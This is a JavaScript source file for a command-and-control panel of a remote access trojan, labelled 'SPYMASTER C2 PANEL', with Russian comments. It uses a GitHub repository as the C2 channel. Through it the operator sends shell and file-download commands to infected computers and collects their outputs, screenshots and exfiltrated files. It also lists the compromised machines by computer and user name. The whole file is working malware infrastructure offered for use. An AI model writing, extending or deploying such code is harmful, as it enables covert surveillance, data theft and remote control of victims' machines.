// ============= SPYMASTER C2 PANEL - СКРИНШОТЫ КАК КАРТИНКИ =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

// ============= КОНФИГУРАЦИЯ =============
let GITHUB_USERNAME = "gitnikaaaa";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Загрузка сохранённых данных
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
    }
} catch(e) {}

if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB:");
        if (GITHUB_TOKEN) localStorage.setItem("github_token", GITHUB_TOKEN);
    }
}

if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ LOGIN GITHUB:");
        if (GITHUB_USERNAME) localStorage.setItem("github_username", GITHUB_USERNAME);
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

let clients = [];
let seenFiles = [];
let autoRefresh = null;
let currentClient = "all";

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    if (!logContainer) return;
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

// ============= ПРОВЕРКА ЯВЛЯЕТСЯ ЛИ СТРОКА BASE64 ИЗОБРАЖЕНИЕМ =============
function isBase64Image(str) {
    if (!str || typeof str !== 'string') return false;
    // Проверяем сигнатуру PNG (iVBORw0KGgo) или JPG (/9j/4AAQ)
    return str.startsWith('iVBORw0KGgo') || str.startsWith('/9j/4AAQ');
}

function isImageFile(filename) {
    return filename.endsWith('.png') || filename.endsWith('.jpg') || filename.endsWith('.jpeg');
}

// ============= ОТПРАВКА КОМАНД =============
async function sendCommand(command, clientId = null) {
    if (!command) return;
    
    const targetClient = clientId || currentClient || "all";
    let finalCommand = command;
    if (targetClient !== "all") {
        finalCommand = `@${targetClient} ${command}`;
    }
    
    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
    
    try {
        let response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
        
        let currentContent = "";
        let sha = null;
        
        if (response.status === 200) {
            const data = await response.json();
            currentContent = atob(data.content);
            sha = data.sha;
        }
        
        const newContent = currentContent + finalCommand + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        const putResponse = await fetch(`${API_URL}/commands.txt`, {
            method: "PUT",
            headers: HEADERS,
            body: JSON.stringify(putData)
        });
        
        if (putResponse.status === 200 || putResponse.status === 201) {
            addLog(`✅ ОТПРАВЛЕНО: ${command}`, "success");
            showNotification(`✅ ${command}`, "success");
        } else {
            addLog(`❌ ОШИБКА: ${putResponse.status}`, "error");
        }
        
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
    }
}

// ============= ОБРАБОТКА СКРИНШОТА (base64 -> картинка) =============
function displayScreenshot(base64Data, filename) {
    const grid = document.getElementById("screensGrid");
    if (!grid) return;
    
    // Создаём карточку
    const card = document.createElement("div");
    card.className = "screenshot-card";
    card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:8px;overflow:hidden;background:#0a0e27;transition:transform 0.2s";
    card.onmouseover = () => card.style.transform = "scale(1.02)";
    card.onmouseout = () => card.style.transform = "scale(1)";
    
    // Создаём изображение из base64
    const img = document.createElement("img");
    img.src = `data:image/png;base64,${base64Data}`;
    img.style.cssText = "width:100%;height:150px;object-fit:cover;background:#0a0e27";
    
    // Обработчик клика для увеличения
    card.onclick = () => {
        const modal = document.createElement("div");
        modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
        const modalImg = document.createElement("img");
        modalImg.src = `data:image/png;base64,${base64Data}`;
        modalImg.style.cssText = "max-width:90%;max-height:90%;border:2px solid #00ff41";
        modal.appendChild(modalImg);
        modal.onclick = () => modal.remove();
        document.body.appendChild(modal);
    };
    
    const info = document.createElement("div");
    info.style.cssText = "padding:8px;font-size:10px;text-align:center";
    info.innerText = filename;
    
    card.appendChild(img);
    card.appendChild(info);
    
    // Добавляем в начало сетки
    if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
        grid.innerHTML = "";
    }
    grid.insertBefore(card, grid.firstChild);
    
    // Ограничиваем количество (оставляем последние 20)
    while (grid.children.length > 20) {
        grid.removeChild(grid.lastChild);
    }
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const response = await fetch(API_URL, { headers: HEADERS });
        if (!response.ok) return;
        
        const files = await response.json();
        if (!Array.isArray(files)) return;
        
        // Разделяем файлы по типам
        const results = files.filter(f => f.name.startsWith("result_") && f.name.endsWith(".txt"));
        const screenshotFiles = files.filter(f => f.name.startsWith("screenshot_") && (f.name.endsWith(".png") || f.name.endsWith(".txt")));
        const fileDownloads = files.filter(f => f.name.startsWith("file_"));
        
        // Обновляем статистику
        const resultsCount = document.getElementById("resultsCount");
        const screensCount = document.getElementById("screensCount");
        const clientsCount = document.getElementById("clientsCount");
        if (resultsCount) resultsCount.innerText = results.length;
        if (screensCount) screensCount.innerText = screenshotFiles.length;
        if (clientsCount) clientsCount.innerText = clients.length;
        
        // ============= ОБРАБОТКА РЕЗУЛЬТАТОВ (result_xxx.txt) =============
        for (const file of results) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                const content = await fetch(file.download_url).then(r => r.text());
                addLog(`📥 ${file.name}`, "result");
                
                // Показываем первые строки результата
                const lines = content.split('\n').slice(0, 10);
                for (const line of lines) {
                    if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result");
                }
                
                // ПАРСИНГ КЛИЕНТА из результата
                let pcMatch = content.match(/PC:\s*([^\n]+)/);
                if (!pcMatch) pcMatch = content.match(/\[Connected\]\s*PC:\s*([^\n]+)/i);
                if (!pcMatch) pcMatch = content.match(/COMPUTERNAME[=:]\s*([^\n]+)/i);
                
                if (pcMatch) {
                    const clientId = pcMatch[1].trim();
                    const userMatch = content.match(/User:\s*([^\n]+)/);
                    const userName = userMatch ? userMatch[1].trim() : "Unknown";
                    
                    if (!clients.find(c => c.id === clientId)) {
                        clients.push({
                            id: clientId,
                            user: userName,
                            firstSeen: new Date().toLocaleString()
                        });
                        updateClientsList();
                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${clientId} (${userName})`, "client");
                        showNotification(`Новый клиент: ${clientId}`, "success");
                    }
                }
            }
        }
        
        // ============= ОБРАБОТКА СКРИНШОТОВ =============
        for (const file of screenshotFiles) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                
                const content = await fetch(file.download_url).then(r => r.text());
                
                // Проверяем, является ли содержимое base64 изображением
                if (isBase64Image(content)) {
                    addLog(`📸 СКРИНШОТ: ${file.name} (base64 -> картинка)`, "success");
                    displayScreenshot(content, file.name);
                    showNotification(`Скриншот получен!`, "success");
                } 
                // Если это PNG файл
                else if (file.name.endsWith('.png')) {
                    addLog(`📸 СКРИНШОТ: ${file.name} (PNG файл)`, "success");
                    // Отображаем как обычную картинку
                    const grid = document.getElementById("screensGrid");
                    if (grid) {
                        const card = document.createElement("div");
                        card.className = "screenshot-card";
                        card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:8px;overflow:hidden;background:#0a0e27";
                        const img = document.createElement("img");
                        img.src = file.download_url + "?t=" + Date.now();
                        img.style.cssText = "width:100%;height:150px;object-fit:cover";
                        card.onclick = () => window.open(file.download_url, '_blank');
                        const info = document.createElement("div");
                        info.style.cssText = "padding:8px;font-size:10px;text-align:center";
                        info.innerText = file.name;
                        card.appendChild(img);
                        card.appendChild(info);
                        if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
                            grid.innerHTML = "";
                        }
                        grid.insertBefore(card, grid.firstChild);
                    }
                }
                // Текстовый скриншот (костыль)
                else {
                    addLog(`📸 СКРИНШОТ (текст): ${file.name}`, "result");
                    addLog(`   ${content.substring(0, 200)}`, "result");
                }
            }
        }
        
        // ============= ОБНОВЛЕНИЕ СПИСКА ФАЙЛОВ =============
        const filesList = document.getElementById("filesList");
        if (filesList) {
            if (fileDownloads.length > 0) {
                filesList.innerHTML = "";
                for (const file of fileDownloads.slice(-20).reverse()) {
                    const item = document.createElement("div");
                    item.className = "file-item";
                    item.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:5px;padding:10px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center";
                    item.innerHTML = `
                        <span style="font-size:12px">📄 ${file.name}</span>
                        <button class="file-download" onclick="window.open('${file.download_url}', '_blank')" style="background:#1a1f4e;border:none;color:#00ff41;padding:5px10px;cursor:pointer;border-radius:4px">⬇️ СКАЧАТЬ</button>
                    `;
                    filesList.appendChild(item);
                }
            } else {
                filesList.innerHTML = '<div class="empty-message" style="text-align:center;padding:40px;color:#444">📭 Нет загруженных файлов</div>';
            }
        }
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

// ============= ОБНОВЛЕНИЕ СПИСКА КЛИЕНТОВ =============
function updateClientsList() {
    // Обновляем селект
    const select = document.getElementById("clientSelect");
    if (select) {
        select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
        for (const client of clients) {
            select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
        }
    }
    
    // Обновляем вкладку "Клиенты"
    const clientsDiv = document.getElementById("clientsList");
    if (clientsDiv) {
        if (clients.length > 0) {
            clientsDiv.innerHTML = "";
            for (const client of clients) {
                const card = document.createElement("div");
                card.className = "client-card";
                card.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:8px;padding:12px;margin-bottom:10px;cursor:pointer;transition:all 0.2s";
                card.onmouseover = () => card.style.background = "#1a1f4e";
                card.onmouseout = () => card.style.background = "#0a0e27";
                card.onclick = () => {
                    document.getElementById("clientSelect").value = client.id;
                    currentClient = client.id;
                    addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
                };
                card.innerHTML = `
                    <div style="font-weight:bold;font-size:14px">🖥️ ${escapeHtml(client.id)}</div>
                    <div style="font-size:11px;color:#888">👤 ${escapeHtml(client.user)}</div>
                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>
                `;
                clientsDiv.appendChild(card);
            }
        } else {
            clientsDiv.innerHTML = '<div class="empty-message" style="text-align:center;padding:40px;color:#444">💤 Нет подключенных клиентов</div>';
        }
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============= ОСТАЛЬНЫЕ ФУНКЦИИ =============
async function clearCommands() {
    try {
        const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
        if (response.status === 200) {
            const data = await response.json();
            await fetch(`${API_URL}/commands.txt`, {
                method: "PUT",
                headers: HEADERS,
                body: JSON.stringify({
                    message: "Clear commands",
                    content: btoa(""),
                    sha: data.sha,
                    branch: "main"
                })
            });
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

async function testConnection() {
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system");
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        if (response.ok) {
            const user = await response.json();
            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            const indicator = document.getElementById("statusIndicator");
            const statusText = document.getElementById("statusText");
            if (indicator) indicator.classList.add("online");
            if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
        return false;
    }
}

function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => loadResults(), 5000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system");
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
function init() {
    addLog("🐀 SPYMASTER C2 PANEL v3.0", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    
    // Стили
    if (!document.querySelector("#dynamic-styles")) {
        const style = document.createElement('style');
        style.id = "dynamic-styles";
        style.textContent = `
            @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
            .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
            .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
            .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
            .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
            .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
            .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; transition: transform 0.2s; }
            .screenshot-card:hover { transform: scale(1.02); }
            .client-card { cursor: pointer; transition: all 0.2s; }
            .client-card:hover { background: #1a1f4e !important; transform: translateX(5px); }
            .file-item { background: #0a0e27; border: 1px solid #00ff41; border-radius: 5px; padding: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
            .file-download { background: #1a1f4e; border: none; color: #00ff41; padding: 5px 10px; cursor: pointer; border-radius: 4px; }
            .empty-message { text-align: center; padding: 40px; color: #444; }
        `;
        document.head.appendChild(style);
    }
    
    testConnection();
    startAutoRefresh();
    loadResults();
    
    // Кнопки
    document.querySelectorAll('.cmd-btn, .cmd-small').forEach(btn => {
        btn.onclick = () => {
            const cmd = btn.getAttribute('data-cmd');
            if (cmd) sendCommand(cmd);
        };
    });
    
    // Кастомная команда
    const sendBtn = document.getElementById('sendCustomBtn');
    if (sendBtn) {
        sendBtn.onclick = () => {
            const input = document.getElementById('customCmd');
            if (input && input.value) {
                sendCommand(input.value);
                input.value = '';
            }
        };
    }
    
    // Download
    const downloadBtn = document.getElementById('downloadBtn');
    if (downloadBtn) {
        downloadBtn.onclick = () => {
            const input = document.getElementById('downloadPath');
            if (input && input.value) {
                sendCommand(`/download ${input.value}`);
            }
        };
    }
    
    // Shell
    const shellBtn = document.getElementById('shellBtn');
    if (shellBtn) {
        shellBtn.onclick = () => {
            const input = document.getElementById('shellCmd');
            if (input && input.value) {
                sendCommand(`/cmd ${input.value}`);
            }
        };
    }
    
    // Очистка команд
    const clearBtn = document.getElementById('clearCommandsBtn');
    if (clearBtn) clearBtn.onclick = () => clearCommands();
    
    // Обновление
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.onclick = () => loadResults();
    
    // Очистка всего
    const clearAllBtn = document.getElementById('clearAllBtn');
    if (clearAllBtn) {
        clearAllBtn.onclick = () => {
            if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
                (async () => {
                    const response = await fetch(API_URL, { headers: HEADERS });
                    if (response.ok) {
                        const files = await response.json();
                        const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
                        let deleted = 0;
                        for (const file of files) {
                            if (protectedFiles.includes(file.name)) continue;
                            await fetch(`${API_URL}/${file.name}`, {
                                method: "DELETE",
                                headers: HEADERS,
                                body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
                            });
                            deleted++;
                            await new Promise(r => setTimeout(r, 100));
                        }
                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
                        seenFiles = [];
                        clients = [];
                        loadResults();
                    }
                })();
            }
        };
    }
    
    // Выбор клиента
    const clientSelect = document.getElementById('clientSelect');
    if (clientSelect) {
        clientSelect.onchange = (e) => {
            currentClient = e.target.value;
            addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
        };
    }
    
    // Вкладки
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');
            const tab = document.getElementById(`${btn.getAttribute('data-tab')}Tab`);
            if (tab) tab.classList.add('active');
        };
    });
    
    addLog("✅ ГОТОВ К РАБОТЕ", "success");
}

// Запуск
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}
